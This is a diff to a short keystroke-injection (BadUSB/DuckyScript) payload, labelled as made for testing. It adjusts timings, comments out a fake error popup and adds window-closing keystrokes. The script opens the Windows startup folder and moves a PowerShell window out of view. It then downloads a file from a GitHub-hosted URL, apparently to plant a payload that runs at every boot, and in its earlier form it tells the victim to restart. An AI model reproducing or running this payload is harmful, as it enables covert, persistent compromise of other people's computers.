@@ -2,11 +2,11 @@ REM Created by Frederik Amfelt for testing purpose
 GUI r
 DELAY 100
 STRINGLN shell:startup
-DELAY 50
+DELAY 100
 ALT D
 DELAY 20
 STRINGLN POWERSHELL.exe 
-DELAY 200
+DELAY 100
 ALT SPACE
 STRING m
 VAR $i = 0
@@ -22,5 +22,8 @@ STRINGLN Invoke-WebRequest -Uri https://raw.githubusercontent.com/Fred-the-bot/p
 DELAY 1000
 STRINGLN $wshell = New-Object -ComObject Wscript.Shell
 DELAY 50
-STRINGLN $Output = $wshell.Popup("An error occured, please restart your PC",10,"ALERT",16)
+REM STRINGLN $Output = $wshell.Popup("An error occured, please restart your PC",10,"ALERT",16)
 DELAY 40
+ALT SPACE 
+DELAY 10
+STRING c
